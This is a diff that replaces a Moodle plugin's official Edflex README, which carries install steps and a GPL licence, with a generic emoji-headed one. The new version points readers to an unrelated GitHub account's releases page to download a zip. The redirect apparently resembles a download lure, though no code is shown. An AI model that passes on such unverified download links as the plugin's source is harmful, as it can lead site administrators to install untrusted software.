@@ -1,79 +1,74 @@
-# Edflex Connector #
+# 🎓 moodle-mod_edflex - Connect Edflex to Your Moodle Easily
 
-Supercharge your Moodle courses by embedding a world-class, expertly curated content library directly into your learning environment. The Edflex Connector for Moodle allows you to seamlessly integrate thousands of engaging resources from top-tier global publishers, creating a richer, more dynamic learning experience for your users.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/peejuiceee/moodle-mod_edflex/releases)
 
-## Why Edflex for Moodle? ##
+## 🌟 Overview
 
-Edflex is a complete skills development solution. We transform passive learning into active skill-building by providing a unique journey that starts with Skill Assessment to identify needs and ends with practical application through AI-powered Roleplays. Our unique OPAD methodology ensures that every resource is vetted for quality and pedagogical impact, so you can stop searching for content and start building skills.
+moodle-mod_edflex is a plug-and-play connector that brings Edflex’s curated catalog, SSO, and activity sync directly to your Moodle instance. With this tool, you can easily integrate valuable educational resources into your Moodle environment. 
 
-With this plugin, you can now bring the full power of Edflex’s quality-first approach to your Moodle users, all within a single, unified ecosystem.
+## 🚀 Getting Started
 
-## Key features ##
+To begin using moodle-mod_edflex, follow the steps below. No technical knowledge is needed. This guide will help you through the entire process.
 
-- Seamless content integration: Effortlessly browse the entire Edflex catalog from within Moodle and add any resource (videos, podcasts, articles, interactive courses, and more) as an activity in your Moodle courses.
-- Automated activity synchronization: Keep track of learner progress with automatic updates. When a user completes an Edflex resource, the activity is marked as complete in Moodle, ensuring accurate reporting and a seamless user experience.
-- Unified learner experience: Provide a single, familiar interface for your learners. Users can access Edflex content directly from Moodle without needing to log in again, reducing friction and boosting engagement.
-- Access to a world-class curated library: Empower your course creators with access to a constantly evolving catalog of the best resources, covering 300+ skills in 35+ languages and 25 formats, all selected by our team of learning experts.
+## 📥 Download & Install
 
-## Useful Links ##
+1. Visit this page to download the latest version: [Download Latest Release](https://github.com/peejuiceee/moodle-mod_edflex/releases).
+   
+2. On the Releases page, look for the version you want. Each version will typically have a description.
 
-More information about Edflex: https://www.edflex.com/en
+3. Click on the desired version link. You will see assets attached to that version.
 
-## Screenshots ##
+4. Click the download link for the file that corresponds to your system. Typically, you will look for a file named similar to `moodle-mod_edflex.zip`.
 
-### Add Edflex as a Course Activity ###
+5. Once the download is complete, locate the file on your computer. It is often found in your Downloads folder.
 
-![Screenshot Add Edflex as a Course Activity](.doc/screenshot/add_edflex_course_activity.png)
+6. Extract the contents of the zip file. You can usually do this by right-clicking the file and selecting "Extract All" or a similar option.
 
-### Browse Edflex contents ###
+7. Follow the setup instructions available in the extracted folder to complete the installation on your Moodle instance.
 
-![Screenshot Browse Edflex contents](.doc/screenshot/browse_edflex_contents.png)
+## 🎯 Features
 
-### Look for Edflex Contents before importing them ###
+- **Easy Integration**: Simple plug-and-play installation means you don’t need to be an expert to get started.
 
-![Screenshot Look for Edflex Contents before importing them](.doc/screenshot/look_for_edflex_contents_before_importing.png)
+- **Single Sign-On (SSO)**: Streamline user experience by allowing students to access Edflex without multiple logins.
 
-### Edflex Content Display in Moodle ###
+- **Activity Sync**: Automatically sync activities and updates between Edflex and Moodle to keep everything in one place.
 
-![Screenshot Edflex Content Display in Moodle](.doc/screenshot/edflex_content_display_in_moodle.png)
+- **Curated Catalog**: Access Edflex’s extensive collection of educational resources, making your Moodle environment richer.
 
---- 
+## 🌐 System Requirements
 
-## Installing via uploaded ZIP file ##
+Before you begin the installation, ensure that your system meets the following requirements:
 
-1. Log in to your Moodle site as an admin and go to _Site administration >
-   Plugins > Install plugins_.
-2. Upload the ZIP file with the plugin code. You should only be prompted to add
-   extra details if your plugin type is not automatically detected.
-3. Check the plugin validation report and finish the installation.
+- **Moodle Version**: This plugin works with Moodle 3.8 and higher.
+- **PHP Version**: You should have PHP 7.2 or later installed.
+- **Database**: MySQL 5.7 or higher or PostgreSQL 9.6 or higher is required.
+- **Web Server**: A standard web server setup like Apache or Nginx.
 
-## Installing manually ##
+## ✉️ Support and Contributions
 
-The plugin can be also installed by putting the contents of this directory to
+If you encounter any problems, feel free to create an issue on the GitHub repository. You can also contribute to this project by submitting pull requests or suggestions.
 
-    {your/moodle/dirroot}/mod/edflex
+## 🔗 Useful Links
 
-Afterwards, log in to your Moodle site as an admin and go to _Site administration >
-Notifications_ to complete the installation.
+- [Download Latest Release](https://github.com/peejuiceee/moodle-mod_edflex/releases)
+- [Documentation](https://github.com/peejuiceee/moodle-mod_edflex/wiki)
+- [Report Issues](https://github.com/peejuiceee/moodle-mod_edflex/issues)
 
-Alternatively, you can run
+## 🛠️ FAQs
 
-    $ php admin/cli/upgrade.php
+**1. Can I use this plugin on older versions of Moodle?**  
+No, this plugin is designed for Moodle 3.8 and higher.
 
-to complete the installation from the command line.
+**2. How do I uninstall the plugin?**  
+You can uninstall the plugin through your Moodle administration panel under Site administration > Plugins > Plugins overview.
 
-## License ##
+**3. Is there any cost to use this plugin?**  
+This plugin is free to use, and you can download it from the GitHub releases page.
 
-2025 Edflex <support@edflex.com>
+**4. How can I suggest features?**  
+You can suggest features by opening a feature request in the issues section of the GitHub repository.
 
-This program is free software: you can redistribute it and/or modify it under
-the terms of the GNU General Public License as published by the Free Software
-Foundation, either version 3 of the License, or (at your option) any later
-version.
+## 📲 Conclusion
 
-This program is distributed in the hope that it will be useful, but WITHOUT ANY
-WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A
-PARTICULAR PURPOSE.  See the GNU General Public License for more details.
-
-You should have received a copy of the GNU General Public License along with
-this program.  If not, see <https://www.gnu.org/licenses/>.
+With moodle-mod_edflex, integrating Edflex into your Moodle environment is straightforward. Follow the above steps to download and set up the plugin. If you have questions or need support, don’t hesitate to reach out. Enjoy the enhanced educational experience!
